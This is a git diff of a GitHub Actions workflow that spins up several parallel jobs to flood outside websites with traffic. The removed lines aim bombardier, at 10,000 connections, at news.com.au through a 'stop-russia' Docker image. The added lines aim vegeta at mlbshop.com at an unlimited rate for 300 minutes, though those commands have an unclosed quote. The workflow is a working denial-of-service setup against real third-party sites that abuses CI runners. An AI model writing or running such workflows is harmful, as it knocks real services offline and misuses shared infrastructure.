@@ -3,6 +3,8 @@
 #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
 # clone version
 # 10 instances
+# image: abagayev/stop-russia:latest
+#bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 name: Run Docker Command
 
 on:
@@ -24,99 +26,70 @@ jobs:
       - name: Run Docker container inside the action docker
         uses: addnab/docker-run-action@v3
         with:
-            image: abagayev/stop-russia:latest
+            image: peterevans/vegeta:latest
             run: | 
-                  export url="https://www.news.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
+                  export url="https://www.mlbshop.com"
+                  echo "GET $url | vegeta attack -rate 0 -duration 300m
 
   run-docker-command-2:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Instance 2
+      - name: Instance 1
         uses: actions/checkout@v3
 
       - name: Run Docker container inside the action docker
         uses: addnab/docker-run-action@v3
         with:
-            image: abagayev/stop-russia:latest
-            run: |
-                  export url="https://www.news.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
-
+            image: peterevans/vegeta:latest
+            run: | 
+                  export url="https://www.mlbshop.com"
+                  echo "GET $url | vegeta attack -rate 0 -duration 300m
+                  
   run-docker-command-3:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Instance 3
+      - name: Instance 1
         uses: actions/checkout@v3
 
       - name: Run Docker container inside the action docker
         uses: addnab/docker-run-action@v3
         with:
-            image: abagayev/stop-russia:latest
-            run: |
-                  export url="https://www.news.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
+            image: peterevans/vegeta:latest
+            run: | 
+                  export url="https://www.mlbshop.com"
+                  echo "GET $url | vegeta attack -rate 0 -duration 300m
+
   run-docker-command-4:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Instance 4
+      - name: Instance 1
         uses: actions/checkout@v3
 
       - name: Run Docker container inside the action docker
         uses: addnab/docker-run-action@v3
         with:
-            image: abagayev/stop-russia:latest
-            run: |
-                  export url="https://www.news.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
+            image: peterevans/vegeta:latest
+            run: | 
+                  export url="https://www.mlbshop.com"
+                  echo "GET $url | vegeta attack -rate 0 -duration 300m
+
   run-docker-command-5:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Instance 5
+      - name: Instance 1
         uses: actions/checkout@v3
 
       - name: Run Docker container inside the action docker
         uses: addnab/docker-run-action@v3
         with:
-            image: abagayev/stop-russia:latest
-            run: |
-                  export url="https://www.news.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
-
-  run-docker-command-6:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Instance 6
-        uses: actions/checkout@v3
-
-      - name: Run Docker container inside the action docker
-        uses: addnab/docker-run-action@v3
-        with:
-            image: abagayev/stop-russia:latest
-            run: |
-                  export url="https://www.news.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
-
-  run-docker-command-7:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Instance 7
-        uses: actions/checkout@v3
-
-      - name: Run Docker container inside the action docker
-        uses: addnab/docker-run-action@v3
-        with:
-            image: abagayev/stop-russia:latest
-            run: |
-                  export url="https://www.news.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
-
+            image: peterevans/vegeta:latest
+            run: | 
+                  export url="https://www.mlbshop.com"
+                  echo "GET $url | vegeta attack -rate 0 -duration 300m
   # run-docker-command-8:
   #   runs-on: ubuntu-latest
 
